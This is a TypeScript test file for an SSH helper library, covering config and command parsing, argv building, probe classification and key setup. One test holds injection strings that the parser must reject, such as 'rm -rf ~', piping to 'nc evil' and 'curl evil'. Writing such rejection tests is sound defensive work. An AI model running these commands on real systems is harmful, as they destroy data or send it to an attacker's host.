/**
 * The pure SSH model: config parsing, target parsing, argv building, probe
 * classification and roster ordering.
 *
 * Everything here is Node-free by design, so the assertions are about *rules*
 * rather than about a live `ssh`: a wrong connect line is invisible until it
 * fails on someone's machine, which is exactly why it is pinned here instead.
 */
import { describe, expect, it } from 'vitest'
import {
  classifyProbe,
  clampPort,
  dedupeMachines,
  expandHome,
  makeMachine,
  machineSlug,
  parseSshConfig,
  parseSshCommand,
  parseTarget,
  probeArgv,
  rankMachines,
  setupLines,
  shellQuote,
  sshArgv,
  sshLine
} from '../src/shared/ssh'

const HOME = '/Users/tester'

describe('clampPort', () => {
  it('keeps a real port and zeroes everything else', () => {
    expect(clampPort(2222)).toBe(2222)
    expect(clampPort('22')).toBe(22)
    expect(clampPort(0)).toBe(0)
    expect(clampPort(70000)).toBe(0)
    expect(clampPort(-1)).toBe(0)
    expect(clampPort('nope')).toBe(0)
    expect(clampPort(undefined)).toBe(0)
  })
})

describe('expandHome', () => {
  it('expands ~ and ~/ against the caller home, and leaves the rest', () => {
    expect(expandHome('~', HOME)).toBe(HOME)
    expect(expandHome('~/.ssh/id', HOME)).toBe('/Users/tester/.ssh/id')
    expect(expandHome('~user/x', HOME)).toBe('~user/x')
    expect(expandHome('/abs/path', HOME)).toBe('/abs/path')
    expect(expandHome('~/.ssh/id', '')).toBe('~/.ssh/id')
  })

  it('matches a Windows home separator', () => {
    expect(expandHome('~/.ssh/id', 'C:\\Users\\me')).toBe('C:\\Users\\me\\.ssh\\id')
  })
})

describe('shellQuote', () => {
  it('leaves safe tokens bare and single-quotes the rest', () => {
    expect(shellQuote('host')).toBe('host')
    expect(shellQuote('user@host')).toBe('user@host')
    expect(shellQuote('-p')).toBe('-p')
    expect(shellQuote('My Keys/id')).toBe(`'My Keys/id'`)
    expect(shellQuote("it's")).toBe(`'it'\\''s'`)
  })
})

describe('machineSlug', () => {
  it('folds and strips, dropping empty and zero parts', () => {
    expect(machineSlug('Host', 0, 'User')).toBe('host-user')
    expect(machineSlug('a b_c', 22)).toBe('a-b-c-22')
    expect(machineSlug()).toBe('machine')
  })
})

describe('makeMachine', () => {
  it('fills the label and a provisional id, clamping the port', () => {
    const m = makeMachine({ host: 'example.com', user: 'alice', port: '2222' })
    expect(m.label).toBe('alice@example.com')
    expect(m.port).toBe(2222)
    expect(m.source).toBe('saved')
    expect(m.id).toBe('saved:example-com-2222-alice')
  })

  it('falls back to the bare host for a label and keeps an explicit id', () => {
    const m = makeMachine({ host: 'box', id: 'keep-me' })
    expect(m.label).toBe('box')
    expect(m.id).toBe('keep-me')
  })

  it('preserves config and herdr sources but normalises anything else to saved', () => {
    expect(makeMachine({ host: 'h', source: 'config' }).source).toBe('config')
    expect(makeMachine({ host: 'h', source: 'herdr' }).source).toBe('herdr')
    expect(makeMachine({ host: 'h', source: 'bogus' as never }).source).toBe('saved')
  })
})

describe('parseSshConfig', () => {
  it('reads a literal Host block into one machine, alias winning', () => {
    const config = [
      'Host myserver',
      '  HostName 1.2.3.4',
      '  Port 2222',
      '  User alice',
      '  IdentityFile ~/.ssh/id_ed25519'
    ].join('\n')
    const [machine] = parseSshConfig(config)
    expect(machine.alias).toBe('myserver')
    expect(machine.host).toBe('1.2.3.4')
    expect(machine.port).toBe(2222)
    expect(machine.user).toBe('alice')
    expect(machine.identityFile).toBe('~/.ssh/id_ed25519')
    expect(machine.source).toBe('config')
  })

  it('falls back to the alias as host when HostName is absent', () => {
    const [machine] = parseSshConfig('Host box\n  User bob')
    expect(machine.host).toBe('box')
    expect(machine.alias).toBe('box')
    expect(machine.user).toBe('bob')
  })

  it('skips wildcard, negated and Match blocks', () => {
    const config = [
      'Host *',
      '  ServerAliveInterval 60',
      'Host !bad *',
      '  User nobody',
      'Match host example',
      '  User bob',
      'Host real',
      '  HostName 10.0.0.1'
    ].join('\n')
    const machines = parseSshConfig(config)
    expect(machines.map((m) => m.alias)).toEqual(['real'])
  })

  it('does not follow Include and ignores unknown keys', () => {
    const config = ['Include other.conf', 'Host h', '  HostName x', '  ForwardAgent yes'].join('\n')
    const machines = parseSshConfig(config)
    expect(machines).toHaveLength(1)
    expect(machines[0].host).toBe('x')
  })

  it('honours first-value-wins and strips comments', () => {
    const config = [
      '# a comment',
      'Host h',
      '  User first  # trailing',
      '  User second',
      '  Port=2200'
    ].join('\n')
    const [machine] = parseSshConfig(config)
    expect(machine.user).toBe('first')
    expect(machine.port).toBe(2200)
  })

  it('takes the first literal alias when a Host lists several', () => {
    const [machine] = parseSshConfig('Host a b c\n  HostName h')
    expect(machine.alias).toBe('a')
  })

  it('tolerates CRLF and returns nothing for an empty config', () => {
    expect(parseSshConfig('Host h\r\n  HostName x\r\n')).toHaveLength(1)
    expect(parseSshConfig('')).toEqual([])
  })
})

describe('parseTarget', () => {
  it('reads the common spellings', () => {
    expect(parseTarget('host')?.host).toBe('host')
    const a = parseTarget('alice@box')
    expect(a?.user).toBe('alice')
    expect(a?.host).toBe('box')
    const b = parseTarget('alice@box:2222')
    expect(b?.port).toBe(2222)
    const c = parseTarget('ssh://alice@box:2200')
    expect(c?.user).toBe('alice')
    expect(c?.port).toBe(2200)
  })

  it('handles a bracketed IPv6 host', () => {
    const m = parseTarget('[::1]:2222')
    expect(m?.host).toBe('::1')
    expect(m?.port).toBe(2222)
  })

  it('treats a non-numeric colon suffix as part of the host, not a port', () => {
    const m = parseTarget('host:path')
    expect(m?.host).toBe('host:path')
    expect(m?.port).toBe(0)
  })

  it('rejects blanks, and hands a spaced line to the command parser', () => {
    expect(parseTarget('')).toBeNull()
    // Two bare words name no machine: the command parser is the one that
    // decides, and it refuses to guess that the first word was a hostname.
    expect(parseTarget('two words')).toBeNull()
    expect(parseTarget('ssh alice@box:2222')?.host).toBe('box')
  })
})

describe('parseSshCommand', () => {
  it('reads the line a user pastes out of a README or their own history', () => {
    const m = parseSshCommand('ssh wanlian@172.18.29.206 -p 2222')
    expect(m?.host).toBe('172.18.29.206')
    expect(m?.user).toBe('wanlian')
    expect(m?.port).toBe(2222)
    // And the round trip is the same command, which is the point of rebuilding it.
    expect(sshLine(m!)).toBe('ssh -p 2222 wanlian@172.18.29.206')
  })

  it('reads the flags that say where to go, in either order', () => {
    const a = parseSshCommand('ssh -p 2200 -i ~/.ssh/work -J bastion alice@box')
    expect(a?.port).toBe(2200)
    expect(a?.identityFile).toBe('~/.ssh/work')
    expect(a?.proxyJump).toBe('bastion')
    expect(a?.user).toBe('alice')
    // Attached values and clusters are the same flags, spelled tightly.
    const b = parseSshCommand('ssh -vp2200 alice@box')
    expect(b?.port).toBe(2200)
    expect(b?.host).toBe('box')
  })

  it('reads -o the way ssh does, and lets the destination win nothing it already said', () => {
    const m = parseSshCommand('ssh -o Port=2200 -o IdentityFile=~/.ssh/k -l bob box:22')
    expect(m?.port).toBe(2200)
    expect(m?.identityFile).toBe('~/.ssh/k')
    expect(m?.user).toBe('bob')
    expect(m?.host).toBe('box')
  })

  it('drops the remote command instead of typing it into a fresh pane', () => {
    const m = parseSshCommand('ssh alice@box uptime -p 2200')
    expect(m?.host).toBe('box')
    expect(m?.port).toBe(2200)
    expect(sshLine(m!)).toBe('ssh -p 2200 alice@box')
  })

  it('refuses a line carrying a shell metacharacter anywhere', () => {
    for (const line of [
      'box ; rm -rf ~',
      'ssh box; rm -rf ~',
      'ssh box | nc evil 9',
      'ssh box && curl evil',
      'ssh "quoted host"',
      'ssh $(whoami)',
      'ssh box`id`'
    ]) {
      expect(parseSshCommand(line), line).toBeNull()
    }
  })

  it('refuses a destination that is not made of hostname characters', () => {
    expect(parseSshCommand('ssh /etc/passwd')).toBeNull()
    expect(parseSshCommand('ssh ~/somewhere')).toBeNull()
    expect(parseSshCommand('ssh')).toBeNull()
    expect(parseSshCommand('')).toBeNull()
  })

  it('needs an ssh or a flag before it will read two words as host plus command', () => {
    // `box uptime` with nothing marking it as a command is two words, and picking
    // the first would connect somewhere nobody named.
    expect(parseSshCommand('box uptime')).toBeNull()
    expect(parseSshCommand('ssh box uptime')?.host).toBe('box')
    expect(parseSshCommand('-p 2200 box')?.host).toBe('box')
  })
})

describe('sshArgv / sshLine', () => {
  it('lets a config alias win outright', () => {
    const m = makeMachine({ host: '1.2.3.4', alias: 'myserver', port: 2222, user: 'alice' })
    expect(sshArgv(m)).toEqual(['ssh', 'myserver'])
    expect(sshLine(m)).toBe('ssh myserver')
  })

  it('builds the full form for a saved target', () => {
    const m = makeMachine({
      host: '1.2.3.4',
      user: 'alice',
      port: 2222,
      identityFile: '~/.ssh/id',
      proxyJump: 'bastion'
    })
    expect(sshArgv(m, { home: HOME })).toEqual([
      'ssh',
      '-p',
      '2222',
      '-i',
      '/Users/tester/.ssh/id',
      '-J',
      'bastion',
      'alice@1.2.3.4'
    ])
  })

  it('omits the user token when none is known', () => {
    expect(sshArgv(makeMachine({ host: 'box' }))).toEqual(['ssh', 'box'])
  })

  it('quotes a path with a space in the line form', () => {
    const m = makeMachine({ host: 'box', identityFile: '~/My Keys/id' })
    expect(sshLine(m, { home: HOME })).toBe(`ssh -i '/Users/tester/My Keys/id' box`)
  })
})

describe('probeArgv', () => {
  it('is non-interactive and runs a trivial remote command', () => {
    const argv = probeArgv(makeMachine({ host: 'box', user: 'alice', port: 2222 }))
    expect(argv).toContain('BatchMode=yes')
    expect(argv).toContain('StrictHostKeyChecking=accept-new')
    expect(argv[argv.length - 1]).toBe('exit')
    expect(argv).toContain('alice@box')
  })

  it('uses the alias when present', () => {
    const argv = probeArgv(makeMachine({ host: 'h', alias: 'myserver' }))
    expect(argv).toContain('myserver')
    expect(argv.join(' ')).not.toContain('-p')
  })
})

describe('classifyProbe', () => {
  it('maps exit and stderr to a status', () => {
    expect(classifyProbe(0, '')).toBe('ok')
    expect(classifyProbe(255, 'Permission denied (publickey).')).toBe('auth')
    expect(classifyProbe(255, 'Host key verification failed.')).toBe('host-key')
    expect(classifyProbe(255, 'ssh: connect to host x port 22: Connection timed out')).toBe('timeout')
    expect(classifyProbe(255, 'Connection refused')).toBe('unreachable')
    expect(classifyProbe(255, 'Could not resolve hostname x')).toBe('unreachable')
    expect(classifyProbe(127, 'ssh: command not found')).toBe('no-ssh')
    expect(classifyProbe(1, 'something odd')).toBe('error')
  })

  it('lets an explicit timeout win', () => {
    expect(classifyProbe(255, 'Permission denied', true)).toBe('timeout')
  })

  it('tests host-key before auth, since both print Permission denied', () => {
    expect(classifyProbe(255, 'Host key verification failed.\nPermission denied')).toBe('host-key')
  })
})

describe('rankMachines', () => {
  const saved = makeMachine({ host: 'zed', id: 's1', label: 'zed', source: 'saved' })
  const config = makeMachine({ host: 'alpha', alias: 'alpha', source: 'config' })
  const herdr = makeMachine({ host: 'mid', source: 'herdr' })

  it('orders saved, config, herdr and filters by query', () => {
    expect(rankMachines([herdr, config, saved], '').map((m) => m.source)).toEqual([
      'saved',
      'config',
      'herdr'
    ])
    expect(rankMachines([herdr, config, saved], 'alph').map((m) => m.label)).toEqual(['alpha'])
  })
})

describe('dedupeMachines', () => {
  it('keeps the higher-precedence source for one identity', () => {
    const config = makeMachine({ host: 'h', alias: 'h', source: 'config' })
    const herdr = makeMachine({ host: 'h', alias: 'h', source: 'herdr' })
    const result = dedupeMachines([herdr, config])
    expect(result).toHaveLength(1)
    expect(result[0].source).toBe('config')
  })
})

describe('setupLines', () => {
  it('uses ssh-copy-id on posix', () => {
    const m = makeMachine({ host: 'box', user: 'alice', port: 2222 })
    expect(setupLines(m, { platform: 'posix', home: HOME })[0]).toBe(
      'ssh-copy-id -p 2222 alice@box'
    )
  })

  it('pipes the public key on windows and keeps the remote command posix', () => {
    const m = makeMachine({ host: 'box', user: 'alice' })
    const line = setupLines(m, { platform: 'windows' })[0]
    expect(line.startsWith('type ')).toBe(true)
    expect(line).toContain('ssh alice@box')
    expect(line).toContain('authorized_keys')
  })

  it('uses the alias directly when the machine came from config', () => {
    const m = makeMachine({ host: 'h', alias: 'myserver', source: 'config' })
    expect(setupLines(m, { platform: 'posix' })[0]).toBe('ssh-copy-id myserver')
  })
})
